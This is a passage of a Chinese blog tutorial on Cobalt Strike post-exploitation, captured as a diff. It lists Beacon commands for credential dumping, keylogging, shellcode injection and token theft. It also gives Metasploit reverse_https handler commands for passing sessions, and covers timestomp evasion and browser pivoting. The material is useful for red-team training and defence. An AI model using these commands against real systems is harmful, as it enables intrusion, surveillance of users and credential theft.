+        data-srcset="https://raw.githubusercontent.com/AlexsanderShaw/BlogImages/main/img/2023/202402281153869.png, https://raw.githubusercontent.com/AlexsanderShaw/BlogImages/main/img/2023/202402281153869.png 1.5x, https://raw.githubusercontent.com/AlexsanderShaw/BlogImages/main/img/2023/202402281153869.png 2x"
         data-sizes="auto"
-        alt="https://raw.githubusercontent.com/AlexsanderShaw/BlogImages/main/img/2023/202402271919603.png"
-        title="image-20240227191913542" /></p>
-<p>可以看到派生的SMB Beacon，在external的ip后有个<code>∞∞</code>字符。此时SMB Beacon通过父级的HTTPS Beacon与CS服务器进行通信，而SMB Beacon与HTTPS Beacon通过SMB协议进行通信。</p>
+        alt="https://raw.githubusercontent.com/AlexsanderShaw/BlogImages/main/img/2023/202402281153869.png"
+        title="image-20240228115341789" /></p>
+<p><strong>Beacon 菜单</strong></p>
+<p>Access：包含了一些对凭据的操作及提权的选项</p>
 <p><img
         class="lazyload"
         src="/svg/loading.min.svg"
-        data-src="https://raw.githubusercontent.com/AlexsanderShaw/BlogImages/main/img/2023/202402271921658.png"
-        data-srcset="https://raw.githubusercontent.com/AlexsanderShaw/BlogImages/main/img/2023/202402271921658.png, https://raw.githubusercontent.com/AlexsanderShaw/BlogImages/main/img/2023/202402271921658.png 1.5x, https://raw.githubusercontent.com/AlexsanderShaw/BlogImages/main/img/2023/202402271921658.png 2x"
+        data-src="https://raw.githubusercontent.com/AlexsanderShaw/BlogImages/main/img/2023/202402281154374.png"
+        data-srcset="https://raw.githubusercontent.com/AlexsanderShaw/BlogImages/main/img/2023/202402281154374.png, https://raw.githubusercontent.com/AlexsanderShaw/BlogImages/main/img/2023/202402281154374.png 1.5x, https://raw.githubusercontent.com/AlexsanderShaw/BlogImages/main/img/2023/202402281154374.png 2x"
         data-sizes="auto"
-        alt="https://raw.githubusercontent.com/AlexsanderShaw/BlogImages/main/img/2023/202402271921658.png"
-        title="image-20240227192123585" /></p>
-<p>随后，我们把SMB Beacon注入到一个进程中：</p>
+        alt="https://raw.githubusercontent.com/AlexsanderShaw/BlogImages/main/img/2023/202402281154374.png"
+        title="image-20240228115448302" /></p>
+<p>Explore：包含了信息探测与目标交互的选项</p>
 <p><img
         class="lazyload"
         src="/svg/loading.min.svg"
-        data-src="https://raw.githubusercontent.com/AlexsanderShaw/BlogImages/main/img/2023/202402271923150.png"
-        data-srcset="https://raw.githubusercontent.com/AlexsanderShaw/BlogImages/main/img/2023/202402271923150.png, https://raw.githubusercontent.com/AlexsanderShaw/BlogImages/main/img/2023/202402271923150.png 1.5x, https://raw.githubusercontent.com/AlexsanderShaw/BlogImages/main/img/2023/202402271923150.png 2x"
+        data-src="https://raw.githubusercontent.com/AlexsanderShaw/BlogImages/main/img/2023/202402281155778.png"
+        data-srcset="https://raw.githubusercontent.com/AlexsanderShaw/BlogImages/main/img/2023/202402281155778.png, https://raw.githubusercontent.com/AlexsanderShaw/BlogImages/main/img/2023/202402281155778.png 1.5x, https://raw.githubusercontent.com/AlexsanderShaw/BlogImages/main/img/2023/202402281155778.png 2x"
         data-sizes="auto"
-        alt="https://raw.githubusercontent.com/AlexsanderShaw/BlogImages/main/img/2023/202402271923150.png"
-        title="image-20240227192323558" /></p>
-<p>注入完成后，SMB Beacon就转变为对应进程派生的beacon了：</p>
+        alt="https://raw.githubusercontent.com/AlexsanderShaw/BlogImages/main/img/2023/202402281155778.png"
+        title="image-20240228115502710" /></p>
+<p>Pivoting：包含了一些设置代理隧道的选项</p>
 <p><img
         class="lazyload"
         src="/svg/loading.min.svg"
-        data-src="https://raw.githubusercontent.com/AlexsanderShaw/BlogImages/main/img/2023/202402271925697.png"
-        data-srcset="https://raw.githubusercontent.com/AlexsanderShaw/BlogImages/main/img/2023/202402271925697.png, https://raw.githubusercontent.com/AlexsanderShaw/BlogImages/main/img/2023/202402271925697.png 1.5x, https://raw.githubusercontent.com/AlexsanderShaw/BlogImages/main/img/2023/202402271925697.png 2x"
+        data-src="https://raw.githubusercontent.com/AlexsanderShaw/BlogImages/main/img/2023/202402281155410.png"
+        data-srcset="https://raw.githubusercontent.com/AlexsanderShaw/BlogImages/main/img/2023/202402281155410.png, https://raw.githubusercontent.com/AlexsanderShaw/BlogImages/main/img/2023/202402281155410.png 1.5x, https://raw.githubusercontent.com/AlexsanderShaw/BlogImages/main/img/2023/202402281155410.png 2x"
         data-sizes="auto"
-        alt="https://raw.githubusercontent.com/AlexsanderShaw/BlogImages/main/img/2023/202402271925697.png"
-        title="image-20240227192530624" /></p>
-<p>如果需要断开和某个会话的连接，使用unlink命令即可，想再次连上使用link就可以。</p>
-<h3 id="tcp-beacon">TCP Beacon</h3>
-<p>TCP Beacon与SMB Beacon类似，区别在于使用的是TCP协议与父级Beacon进行通信，使用这种方式上线时流量时不加密的。</p>
-<p>在新建tcp beacon时可以指定监听的端口，假设为8888，在不出网的目标主机上执行后，目标主机会监听8888端口，然后父Beacon中使用connect命令进行连接：</p>
+        alt="https://raw.githubusercontent.com/AlexsanderShaw/BlogImages/main/img/2023/202402281155410.png"
+        title="image-20240228115513340" /></p>
+<p>Session：包含了对当前 Beacon 会话管理的选项</p>
 <p><img
         class="lazyload"
         src="/svg/loading.min.svg"
-        data-src="https://raw.githubusercontent.com/AlexsanderShaw/BlogImages/main/img/2023/202402271944597.png"
-        data-srcset="https://raw.githubusercontent.com/AlexsanderShaw/BlogImages/main/img/2023/202402271944597.png, https://raw.githubusercontent.com/AlexsanderShaw/BlogImages/main/img/2023/202402271944597.png 1.5x, https://raw.githubusercontent.com/AlexsanderShaw/BlogImages/main/img/2023/202402271944597.png 2x"
+        data-src="https://raw.githubusercontent.com/AlexsanderShaw/BlogImages/main/img/2023/202402281155360.png"
+        data-srcset="https://raw.githubusercontent.com/AlexsanderShaw/BlogImages/main/img/2023/202402281155360.png, https://raw.githubusercontent.com/AlexsanderShaw/BlogImages/main/img/2023/202402281155360.png 1.5x, https://raw.githubusercontent.com/AlexsanderShaw/BlogImages/main/img/2023/202402281155360.png 2x"
         data-sizes="auto"
-        alt="https://raw.githubusercontent.com/AlexsanderShaw/BlogImages/main/img/2023/202402271944597.png"
-        title="image-20220213210419805" /></p>
-<h3 id="foreign-beacon">Foreign Beacon</h3>
-<p>使用CS的Foreign Beacon可以派生到meterpreter会话，有http和https两种监听器。</p>
-<p>首先在msf中起一个监听器：</p>
+        alt="https://raw.githubusercontent.com/AlexsanderShaw/BlogImages/main/img/2023/202402281155360.png"
+        title="image-20240228115522290" /></p>
+<p><strong>Beacon 命令</strong></p>
+<ul>
+<li>
+<p><code>help</code>：查看 Beacon 命令的帮助信息。使用 help + 待查看帮助的命令可查看该命令的帮助信息。</p>
+</li>
+<li>
+<p><code>clear</code>：清除 Beacon 命令队列。Beacon 是一个异步的 Payload，输入的命令并不会立即执行，而是当 Beacon 连接到团队服务器时再一一执行命令，因此当需要清除队列命令时就可以使用 clear 命令。</p>
+</li>
+<li>
+<p><code>sleep</code>：改变 Beacon 的休眠时间。输入 <code>sleep 30</code>表示休眠30秒；输入<code>sleep 60 50</code>表示，随机睡眠 30秒至60秒，其中30秒 = 60 x 50%；如果输入 <code>sleep 0</code>则表示进入交互模式，任何输入的命令都会被立即执行，当输入一些命令，比如<code>desktop</code>时， Beacon 会自动进入交互模式。</p>
+</li>
+<li>
+<p><code>shell</code>：通过受害主机的 cmd.exe 执行命令。比如运行<code>ipconfig</code>，就需要输入<code>shell ipconfig</code></p>
+</li>
+<li>
+<p><code>run</code>：不使用 cmd.exe 执行命令。该命令也是 run + 命令的形式运行，该命令会将执行结果回显。</p>
+</li>
+<li>
+<p><code>execute</code>：执行命令，但不回显结果。</p>
+</li>
+<li>
+<p><code>cd</code>：切换当前工作目录。</p>
+</li>
+<li>
+<p><code>pwd</code>：查看当前所在目录。</p>
+</li>
+<li>
+<p><code>powershell</code>：通过受害主机的 PowerShell 执行命令。比如想在 PowerShell 下运行 <code>ipconfig</code>，就需要输入<code>powershell ipconfig</code></p>
+</li>
+<li>
+<p><code>powerpick</code>：不使用 powershell.exe 执行 powershell 命令。这个命令依赖于由 Lee Christensen 开发的非托管 PowerShell 技术。powershell 和 powerpick 命令会使用当前令牌（ token ）。</p>
+</li>
+<li>
+<p><code>psinject</code>：将非托管的 PowerShell 注入到一个特定的进程中并从此位置运行命令。</p>
+</li>
+<li>
+<p><code>powershell-import</code>：导入 PowerShell 脚本到 Beacon 中。直接运行 powershell-import + 脚本文件路径即可，但是这个脚本导入命令一次仅能保留一个 PowerShell 脚本，再导入一个新脚本的时候，上一个脚本就被覆盖了，因此可以通过导入一个空文件来清空 Beacon 中导入的脚本。</p>
+</li>
+<li>
+<p><code>powershell get-help</code>：获取 PowerShell 命令的相关帮助信息。比如想获取 PowerShell 下 get-process 命令的帮助，就需要输入<code>powershell get-help get-process</code></p>
+</li>
+<li>
+<p><code>execute-assembly</code>：将一个本地的 .NET 可执行文件作为 Beacon 的后渗透任务来运行。</p>
+</li>
+<li>
+<p><code>setenv</code>：设置一个环境变量。</p>
+</li>
+</ul>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">  1
+</span><span class="lnt">  2
+</span><span class="lnt">  3
+</span><span class="lnt">  4
+</span><span class="lnt">  5
+</span><span class="lnt">  6
+</span><span class="lnt">  7
+</span><span class="lnt">  8
+</span><span class="lnt">  9
+</span><span class="lnt"> 10
+</span><span class="lnt"> 11
+</span><span class="lnt"> 12
+</span><span class="lnt"> 13
+</span><span class="lnt"> 14
+</span><span class="lnt"> 15
+</span><span class="lnt"> 16
+</span><span class="lnt"> 17
+</span><span class="lnt"> 18
+</span><span class="lnt"> 19
+</span><span class="lnt"> 20
+</span><span class="lnt"> 21
+</span><span class="lnt"> 22
+</span><span class="lnt"> 23
+</span><span class="lnt"> 24
+</span><span class="lnt"> 25
+</span><span class="lnt"> 26
+</span><span class="lnt"> 27
+</span><span class="lnt"> 28
+</span><span class="lnt"> 29
+</span><span class="lnt"> 30
+</span><span class="lnt"> 31
+</span><span class="lnt"> 32
+</span><span class="lnt"> 33
+</span><span class="lnt"> 34
+</span><span class="lnt"> 35
+</span><span class="lnt"> 36
+</span><span class="lnt"> 37
+</span><span class="lnt"> 38
+</span><span class="lnt"> 39
+</span><span class="lnt"> 40
+</span><span class="lnt"> 41
+</span><span class="lnt"> 42
+</span><span class="lnt"> 43
+</span><span class="lnt"> 44
+</span><span class="lnt"> 45
+</span><span class="lnt"> 46
+</span><span class="lnt"> 47
+</span><span class="lnt"> 48
+</span><span class="lnt"> 49
+</span><span class="lnt"> 50
+</span><span class="lnt"> 51
+</span><span class="lnt"> 52
+</span><span class="lnt"> 53
+</span><span class="lnt"> 54
+</span><span class="lnt"> 55
+</span><span class="lnt"> 56
+</span><span class="lnt"> 57
+</span><span class="lnt"> 58
+</span><span class="lnt"> 59
+</span><span class="lnt"> 60
+</span><span class="lnt"> 61
+</span><span class="lnt"> 62
+</span><span class="lnt"> 63
+</span><span class="lnt"> 64
+</span><span class="lnt"> 65
+</span><span class="lnt"> 66
+</span><span class="lnt"> 67
+</span><span class="lnt"> 68
+</span><span class="lnt"> 69
+</span><span class="lnt"> 70
+</span><span class="lnt"> 71
+</span><span class="lnt"> 72
+</span><span class="lnt"> 73
+</span><span class="lnt"> 74
+</span><span class="lnt"> 75
+</span><span class="lnt"> 76
+</span><span class="lnt"> 77
+</span><span class="lnt"> 78
+</span><span class="lnt"> 79
+</span><span class="lnt"> 80
+</span><span class="lnt"> 81
+</span><span class="lnt"> 82
+</span><span class="lnt"> 83
+</span><span class="lnt"> 84
+</span><span class="lnt"> 85
+</span><span class="lnt"> 86
+</span><span class="lnt"> 87
+</span><span class="lnt"> 88
+</span><span class="lnt"> 89
+</span><span class="lnt"> 90
+</span><span class="lnt"> 91
+</span><span class="lnt"> 92
+</span><span class="lnt"> 93
+</span><span class="lnt"> 94
+</span><span class="lnt"> 95
+</span><span class="lnt"> 96
+</span><span class="lnt"> 97
+</span><span class="lnt"> 98
+</span><span class="lnt"> 99
+</span><span class="lnt">100
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">    Command                   Description
+</span></span><span class="line"><span class="cl">    -------                   -----------
+</span></span><span class="line"><span class="cl">    !                         Run a <span class="nb">command</span> from the <span class="nb">history</span>
+</span></span><span class="line"><span class="cl">    argue                     Spoof arguments <span class="k">for</span> matching processes
+</span></span><span class="line"><span class="cl">    blockdlls                 Block non-Microsoft DLLs in child processes
+</span></span><span class="line"><span class="cl">    browserpivot              Setup a browser pivot session
+</span></span><span class="line"><span class="cl">    cancel                    Cancel a download that<span class="s1">&#39;s in-progress
+</span></span></span><span class="line"><span class="cl"><span class="s1">    cd                        Change directory
+</span></span></span><span class="line"><span class="cl"><span class="s1">    checkin                   Call home and post data
+</span></span></span><span class="line"><span class="cl"><span class="s1">    chromedump                Recover credentials from Google Chrome
+</span></span></span><span class="line"><span class="cl"><span class="s1">    clear                     Clear beacon queue
+</span></span></span><span class="line"><span class="cl"><span class="s1">    clipboard                 Attempt to get text clipboard contents
+</span></span></span><span class="line"><span class="cl"><span class="s1">    connect                   Connect to a Beacon peer over TCP
+</span></span></span><span class="line"><span class="cl"><span class="s1">    covertvpn                 Deploy Covert VPN client
+</span></span></span><span class="line"><span class="cl"><span class="s1">    cp                        Copy a file
+</span></span></span><span class="line"><span class="cl"><span class="s1">    data-store                Store post-ex items to Beacon
+</span></span></span><span class="line"><span class="cl"><span class="s1">    dcsync                    Extract a password hash from a DC
+</span></span></span><span class="line"><span class="cl"><span class="s1">    desktop                   View and interact with target&#39;</span>s desktop
+</span></span><span class="line"><span class="cl">    dllinject                 Inject a Reflective DLL into a process
+</span></span><span class="line"><span class="cl">    dllload                   Load DLL into a process with LoadLibrary<span class="o">()</span>
+</span></span><span class="line"><span class="cl">    download                  Download a file
+</span></span><span class="line"><span class="cl">    downloads                 Lists file downloads in progress
+</span></span><span class="line"><span class="cl">    drives                    List drives on target
+</span></span><span class="line"><span class="cl">    elevate                   Spawn a session in an elevated context
+</span></span><span class="line"><span class="cl">    execute                   Execute a program on target <span class="o">(</span>no output<span class="o">)</span>
+</span></span><span class="line"><span class="cl">    execute-assembly          Execute a <span class="nb">local</span> .NET program in-memory on target
+</span></span><span class="line"><span class="cl">    <span class="nb">exit</span>                      Terminate the beacon session
+</span></span><span class="line"><span class="cl">    file_browser              Open the file browser tab <span class="k">for</span> this beacon
+</span></span><span class="line"><span class="cl">    getprivs                  Enable system privileges on current token
+</span></span><span class="line"><span class="cl">    getsystem                 Attempt to get SYSTEM
+</span></span><span class="line"><span class="cl">    getuid                    Get User ID
+</span></span><span class="line"><span class="cl">    hashdump                  Dump password hashes
+</span></span><span class="line"><span class="cl">    <span class="nb">help</span>                      Help menu
+</span></span><span class="line"><span class="cl">    <span class="nb">history</span>                   Show the <span class="nb">command</span> <span class="nb">history</span>
+</span></span><span class="line"><span class="cl">    inject                    Spawn a session in a specific process
+</span></span><span class="line"><span class="cl">    inline-execute            Run a Beacon Object File in this session
+</span></span><span class="line"><span class="cl">    jobkill                   Kill a long-running post-exploitation task
+</span></span><span class="line"><span class="cl">    <span class="nb">jobs</span>                      List long-running post-exploitation tasks
+</span></span><span class="line"><span class="cl">    jump                      Spawn a session on a remote host
+</span></span><span class="line"><span class="cl">    kerberos_ccache_use       Apply kerberos ticket from cache to this session
+</span></span><span class="line"><span class="cl">    kerberos_ticket_purge     Purge kerberos tickets from this session
+</span></span><span class="line"><span class="cl">    kerberos_ticket_use       Apply kerberos ticket to this session
+</span></span><span class="line"><span class="cl">    keylogger                 Start a keystroke logger
+</span></span><span class="line"><span class="cl">    <span class="nb">kill</span>                      Kill a process
+</span></span><span class="line"><span class="cl">    link                      Connect to a Beacon peer over a named pipe
+</span></span><span class="line"><span class="cl">    logonpasswords            Dump credentials and hashes with mimikatz
+</span></span><span class="line"><span class="cl">    ls                        List files
+</span></span><span class="line"><span class="cl">    make_token                Create a token to pass credentials
+</span></span><span class="line"><span class="cl">    mimikatz                  Runs a mimikatz <span class="nb">command</span>
+</span></span><span class="line"><span class="cl">    mkdir                     Make a directory
+</span></span><span class="line"><span class="cl">    mode dns                  Use DNS A as data channel <span class="o">(</span>DNS beacon only<span class="o">)</span>
+</span></span><span class="line"><span class="cl">    mode dns-txt              Use DNS TXT as data channel <span class="o">(</span>DNS beacon only<span class="o">)</span>
+</span></span><span class="line"><span class="cl">    mode dns6                 Use DNS AAAA as data channel <span class="o">(</span>DNS beacon only<span class="o">)</span>
+</span></span><span class="line"><span class="cl">    mv                        Move a file
+</span></span><span class="line"><span class="cl">    net                       Network and host enumeration tool
+</span></span><span class="line"><span class="cl">    note                      Assign a note to this Beacon
+</span></span><span class="line"><span class="cl">    portscan                  Scan a network <span class="k">for</span> open services
+</span></span><span class="line"><span class="cl">    powerpick                 Execute a <span class="nb">command</span> via Unmanaged PowerShell
+</span></span><span class="line"><span class="cl">    powershell                Execute a <span class="nb">command</span> via powershell.exe
+</span></span><span class="line"><span class="cl">    powershell-import         Import a powershell script
+</span></span><span class="line"><span class="cl">    ppid                      Set parent PID <span class="k">for</span> spawned post-ex <span class="nb">jobs</span>
+</span></span><span class="line"><span class="cl">    printscreen               Take a single screenshot via PrintScr method
+</span></span><span class="line"><span class="cl">    process_browser           Open the process browser tab <span class="k">for</span> this beacon
+</span></span><span class="line"><span class="cl">    ps                        Show process list
+</span></span><span class="line"><span class="cl">    psinject                  Execute PowerShell <span class="nb">command</span> in specific process
+</span></span><span class="line"><span class="cl">    pth                       Pass-the-hash using Mimikatz
+</span></span><span class="line"><span class="cl">    <span class="nb">pwd</span>                       Print current directory
+</span></span><span class="line"><span class="cl">    reg                       Query the registry
+</span></span><span class="line"><span class="cl">    remote-exec               Run a <span class="nb">command</span> on a remote host
+</span></span><span class="line"><span class="cl">    rev2self                  Revert to original token
+</span></span><span class="line"><span class="cl">    rm                        Remove a file or folder
+</span></span><span class="line"><span class="cl">    rportfwd                  Setup a reverse port forward
+</span></span><span class="line"><span class="cl">    rportfwd_local            Setup a reverse port forward via Cobalt Strike client
+</span></span><span class="line"><span class="cl">    run                       Execute a program on target <span class="o">(</span>returns output<span class="o">)</span>
+</span></span><span class="line"><span class="cl">    runas                     Execute a program as another user
+</span></span><span class="line"><span class="cl">    runasadmin                Execute a program in an elevated context
+</span></span><span class="line"><span class="cl">    runu                      Execute a program under another PID
+</span></span><span class="line"><span class="cl">    screenshot                Take a single screenshot
+</span></span><span class="line"><span class="cl">    screenwatch               Take periodic screenshots of desktop
+</span></span><span class="line"><span class="cl">    setenv                    Set an environment variable
+</span></span><span class="line"><span class="cl">    shell                     Execute a <span class="nb">command</span> via cmd.exe
+</span></span><span class="line"><span class="cl">    shinject                  Inject shellcode into a process
+</span></span><span class="line"><span class="cl">    shspawn                   Spawn process and inject shellcode into it
+</span></span><span class="line"><span class="cl">    sleep                     Set beacon sleep <span class="nb">time</span>
+</span></span><span class="line"><span class="cl">    socks                     Start/Stop a SOCKS4a/SOCKS5 server to relay traffic
+</span></span><span class="line"><span class="cl">    spawn                     Spawn a session 
+</span></span><span class="line"><span class="cl">    spawnas                   Spawn a session as another user
+</span></span><span class="line"><span class="cl">    spawnto                   Set executable to spawn processes into
+</span></span><span class="line"><span class="cl">    spawnu                    Spawn a session under another process
+</span></span><span class="line"><span class="cl">    spunnel                   Spawn and tunnel an agent via rportfwd
+</span></span><span class="line"><span class="cl">    spunnel_local             Spawn and tunnel an agent via Cobalt Strike client rportfwd
+</span></span><span class="line"><span class="cl">    ssh                       Use SSH to spawn an SSH session on a host
+</span></span><span class="line"><span class="cl">    ssh-key                   Use SSH to spawn an SSH session on a host
+</span></span><span class="line"><span class="cl">    steal_token               Steal access token from a process
+</span></span><span class="line"><span class="cl">    syscall-method            Change or query the syscall method
+</span></span><span class="line"><span class="cl">    timestomp                 Apply timestamps from one file to another
+</span></span><span class="line"><span class="cl">    token-store               Hot-swappable access tokens
+</span></span><span class="line"><span class="cl">    unlink                    Disconnect from parent Beacon
+</span></span><span class="line"><span class="cl">    upload                    Upload a file
+</span></span><span class="line"><span class="cl">    windows_error_code        Show the Windows error code <span class="k">for</span> a Windows error code number
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h3 id="session传递">session传递</h3>
+<p><strong>会话传递相关命令</strong></p>
+<p>Beacon 被设计的最初目的就是向其他的 CS 监听器传递会话。</p>
+<ul>
+<li><code>spawn</code>：进行会话的传递，也可直接右击会话选择<code>spawn</code>命令进行会话的选择。默认情况下，<code>spawn</code>命令会在 rundll32.exe 中派生一个会话。为了更好的隐蔽性，可以找到更合适的程序（如 Internet Explorer） 并使用<code>spawnto</code>命令来说明在派生新会话时候会使用 Beacon 中的哪个程序。</li>
+<li><code>spawnto</code>：该命令会要求指明架构（x86 还是 x64）和用于派生会话的程序的完整路径。单独输入<code>spawnto</code>命令然后按 enter 会指示 Beacon 恢复至其默认行为。</li>
+<li><code>inject</code>：输入<code>inject + 进程 id + 监听器名</code>来把一个会话注入一个特定的进程中。使用 ps 命令来获取一个当前系统上的进程列表。使用<code>inject [pid] x64</code>来将一个64位 Beacon 注入到一个 64位进程中。</li>
+<li><code>spawn</code>和<code>inject</code>命令都将一个 payload stage 注入进内存中。如果 payload stage 是 HTTP、HTTPS 或 DNS Beacon 并且它无法连接到你，那么将看不到一个会话。如果 payload stage 是一个绑定的 TCP 或 SMB 的 Beacon，这些命令会自动地尝试连接到并控制这些 payload。</li>
+<li><code>dllinject</code>：<code>dllinject + [pid]</code>来将一个反射性 DLL 注入到一个进程中。</li>
+<li><code>shinject</code>：使用<code>shinject [pid] [架构] [/路径/.../file.bin]</code>命令来从一个本地文件中注入 shellcode 到一个目标上的进程中。</li>
+<li><code>shspawn</code>：使用<code>shspawn [架构] [/路径/.../file.bin]</code>命令会先派生一个新进程（这个新进程是 spawn to 命令指定的可执行文件），然后把指定的 shellcode 文件（ file.bin ）注入到这个进程中。</li>
+<li><code>dllload</code>：使用<code>dllload [pid] [c:\路径\...\file.dll]</code>来在另一个进程中加载磁盘上的 DLL文件。</li>
+</ul>
+<p><strong>会话传递使用场景</strong></p>
+<p>1、将当前会话传递至其他CS团队服务器中，直接右击<code>spawn</code>选择要传递的监听器即可。</p>
+<p>2、将当前会话传递至MSF中，这里简单做一下演示。</p>
+<p>首先，在MSF中，为攻击载荷新建一个payload</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-gdscript3" data-lang="gdscript3"><span class="line"><span class="cl"><span class="n">msf5</span> <span class="o">&gt;</span> <span class="n">use</span> <span class="n">exploit</span><span class="o">/</span><span class="n">multi</span><span class="o">/</span><span class="n">handler</span>
+</span></span><span class="line"><span class="cl"><span class="n">msf5</span> <span class="n">exploit</span><span class="p">(</span><span class="n">multi</span><span class="o">/</span><span class="n">handler</span><span class="p">)</span> <span class="o">&gt;</span> <span class="n">set</span> <span class="n">payload</span> <span class="n">windows</span><span class="o">/</span><span class="n">meterpreter</span><span class="o">/</span><span class="n">reverse_https</span>
+</span></span><span class="line"><span class="cl"><span class="n">msf5</span> <span class="n">exploit</span><span class="p">(</span><span class="n">multi</span><span class="o">/</span><span class="n">handler</span><span class="p">)</span> <span class="o">&gt;</span> <span class="n">set</span> <span class="n">lhost</span> <span class="mf">192.168</span><span class="o">.</span><span class="mf">175.156</span>
+</span></span><span class="line"><span class="cl"><span class="n">msf5</span> <span class="n">exploit</span><span class="p">(</span><span class="n">multi</span><span class="o">/</span><span class="n">handler</span><span class="p">)</span> <span class="o">&gt;</span> <span class="n">set</span> <span class="n">lport</span> <span class="mi">443</span>
+</span></span><span class="line"><span class="cl"><span class="n">msf5</span> <span class="n">exploit</span><span class="p">(</span><span class="n">multi</span><span class="o">/</span><span class="n">handler</span><span class="p">)</span> <span class="o">&gt;</span> <span class="n">exploit</span> <span class="o">-</span><span class="n">j</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>随后，在CS中新建一个外部<code>Foreign</code>监听器，这里设置的监听IP与端口和MSF中的一致即可，随后在CS中利用<code>spawn</code>选择刚新建的外部监听器，MSF中即可返回会话。</p>
+<h3 id="file-system">File System</h3>
+<p>浏览会话系统文件位置在右击会话处，选择 <code>Explore --&gt; File Browser</code>即可打开。在这里可以对当前会话下的文件进行浏览、上传、下载、删除等操作。</p>
+<p>在进行文件浏览时，如果 beacon 设置的 sleep 值较高，CS会因此而变得响应比较慢。</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://raw.githubusercontent.com/AlexsanderShaw/BlogImages/main/img/2023/202402281221465.png"
+        data-srcset="https://raw.githubusercontent.com/AlexsanderShaw/BlogImages/main/img/2023/202402281221465.png, https://raw.githubusercontent.com/AlexsanderShaw/BlogImages/main/img/2023/202402281221465.png 1.5x, https://raw.githubusercontent.com/AlexsanderShaw/BlogImages/main/img/2023/202402281221465.png 2x"
+        data-sizes="auto"
+        alt="https://raw.githubusercontent.com/AlexsanderShaw/BlogImages/main/img/2023/202402281221465.png"
+        title="image-20220214104914725" /></p>
+<p>彩色文件夹表示该文件夹的内容位于此文件浏览器的缓存中；深灰色的文件夹表示该文件夹的内容不在此文件浏览器缓存中。</p>
+<p><strong>文件下载</strong></p>
+<ul>
+<li><code>download</code>：下载请求的文件。Beacon 会下载它的任务要求获取的每一个文件的固定大小的块。这个块的大小取决于 Beacon 当前的数据通道。HTTP 和 HTTPS 通道会拉取 512kb 的数据块。</li>
+<li><code>downloads</code>：查看当前 Beacon 正在进行的文件下载列表。</li>
+<li><code>cancel</code>：该命令加上一个文件名来取消正在进行的一个下载任务。也可以在 cancel 命令中使用通配符来一次取消多个文件下载任务。</li>
+</ul>
+<p>下载文件都将下载到CS团队服务器中，在<code>View --&gt; Download</code>下可看到下载文件的记录，选中文件后使用<code>Sync Files</code>即可将文件下载到本地。</p>
+<p><strong>文件上传</strong></p>
+<ul>
+<li><code>upload</code>：上传一个文件到目标主机上。</li>
+<li><code>timestomp</code>：将一个文件的修改属性访问属性和创建时间数据与另一个文件相匹配。当上传一个文件时，有时会想改变此文件的时间戳来使其混入同一文件夹下的其他文件中，使用timestomp 命令就可以完成此工作。</li>
+</ul>
+<h3 id="用户驱动溢出攻击">用户驱动溢出攻击</h3>
+<p>Beacon 运行任务的方式是以<code>jobs</code>去运行的，比如键盘记录、PowerShell 脚本、端口扫描等，这些任务都是在 beacon check in 之间于后台运行的。</p>
+<ul>
+<li><code>jobs</code>：查看当前 Beacon 中的任务</li>
+<li><code>jobkill</code>：加上任务 ID，对指定任务进行停止</li>
+</ul>
+<p><strong>屏幕截图</strong></p>
+<ul>
+<li><code>screenshot</code>：获取屏幕截图，使用<code>screenshot pid</code>来将截屏工具注入到一个 x86 的进程中，使用<code>screenshot pid x64</code>注入到一个 x64 进程中，explorer.exe 是一个不错的候选程序。 使用<code>screenshot [pid] [x86|x64] [time]</code>来请求截屏工具运行指定的秒数，并在每一次 Beacon 连接到团队服务器的时候报告一张屏幕截图，这是查看用户桌面的一种简便方法。要查看截屏的具体信息，通过<code>View --&gt; Screenshots</code>来浏览从所有 Beacon 会话中获取的截屏。</li>
+</ul>
+<p><strong>键盘记录</strong></p>
+<ul>
+<li>
+<p><code>keylogger</code>：键盘记录器，使用<code>keylogger pid</code>来注入一个 x86 程序。使用<code>keylogger pid x64</code>来注入一个 x64 程序，explorer.exe 是一个不错的候选程序。 使用单独的 keylogger 命令来将键盘记录器注入一个临时程序。键盘记录器会监视从被注入的程序中的键盘记录并将结果报告给 Beacon，直到程序终止或者自己杀死了这个键盘记录后渗透任务。要查看键盘记录的结果，可以到<code>View --&gt; Keystrokes</code>中进行查看。</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://raw.githubusercontent.com/AlexsanderShaw/BlogImages/main/img/2023/202402281238859.png"
+        data-srcset="https://raw.githubusercontent.com/AlexsanderShaw/BlogImages/main/img/2023/202402281238859.png, https://raw.githubusercontent.com/AlexsanderShaw/BlogImages/main/img/2023/202402281238859.png 1.5x, https://raw.githubusercontent.com/AlexsanderShaw/BlogImages/main/img/2023/202402281238859.png 2x"
+        data-sizes="auto"
+        alt="https://raw.githubusercontent.com/AlexsanderShaw/BlogImages/main/img/2023/202402281238859.png"
+        title="image-20240228123808776" /></p>
+</li>
+</ul>
+<p><strong>其他</strong></p>
+<p>除了上述使用命令的方式进行屏幕截图和键盘记录，也可以来到<code>Explore --&gt; Process List</code>下选择要注入的进程，再直接点击屏幕截图或键盘记录的功能按钮。</p>
+<p>从使用上，具体注入那个程序都是可以的，只是注入 explorer.exe 会比较稳定与持久。值得注意的是，多个键盘记录器可能相互冲突，每个桌面会话只应使用一个键盘记录器。</p>
+<h3 id="browser-pivoting">Browser Pivoting</h3>
+<p>浏览器劫持是指在已经攻击成功的目标中，利用目标的信息登录网站进行会话劫持，但是目前只支持目标正在使用IE浏览器的前提下。关于如何判断当前用户是否使用IE浏览器，则可以通过屏幕截图来判断。</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://raw.githubusercontent.com/AlexsanderShaw/BlogImages/main/img/2023/202402281239030.png"
